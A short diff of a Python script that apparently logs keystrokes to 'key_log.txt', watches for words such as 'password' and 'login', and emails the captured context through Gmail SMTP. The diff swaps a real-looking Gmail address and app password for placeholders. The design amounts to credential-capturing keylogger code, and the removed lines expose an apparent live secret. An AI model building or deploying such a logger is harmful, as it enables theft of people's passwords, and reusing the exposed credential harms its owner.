@@ -11,9 +11,9 @@ LOG_FILE = "key_log.txt"
 TRIGGER_WORDS = ["password", "login", "1234"]
 
 # Email Settings
-SENDER_EMAIL = "sizorqueen9903@gmail.com"
-RECEIVER_EMAIL = "sizorqueen9903@gmail.com"
-APP_PASSWORD = "oxugwnwznqjlhzjh"  # REMINDER: Generate a NEW one and remove spaces
+SENDER_EMAIL = "your_email@gmail.com"
+RECEIVER_EMAIL = "your_email@gmail.com"
+APP_PASSWORD = "your_app_password_here"  # REMINDER: Generate a NEW one and remove spaces
 SMTP_SERVER = "smtp.gmail.com"
 PORT = 465 
 
@@ -37,7 +37,7 @@ def send_email_notification(word, context):
     except Exception as e:
         print(f"Failed to send email: {e}")
 
-# Initialize the mixer once (put this outside your functions)
+# Initialize the mixer once 
 mixer.init()
 
 def trigger_action(trigger_word, full_context):
